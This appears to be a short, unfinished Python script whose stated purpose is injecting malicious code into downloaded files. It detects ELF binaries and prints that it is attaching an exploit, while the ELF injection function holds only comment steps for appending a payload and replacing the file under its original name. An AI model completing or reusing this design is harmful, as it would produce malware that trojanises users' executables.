"""
Injects malicious code into files that it can.
"""

import magic

def inject(filename: str) -> str:
    """
    Injects code into the give file if the file type has an injection technique.
    """

    file_type = magic.from_file("downloads/" + filename)

    print(file_type)

    if "ELF" in file_type:
        print("downloaded a binary and am now attaching the exploit to it")
    else:
        print("no exploit for this file type")

def elf_injection(filename: str) -> None:
    """
    Performs an injection for an ELF file.
    """

    # get the compiled injection

    # cat the payload onto this injection

    # replace the payload with this injection (and don't change name)

if __name__ == "__main__":
    inject("injection")
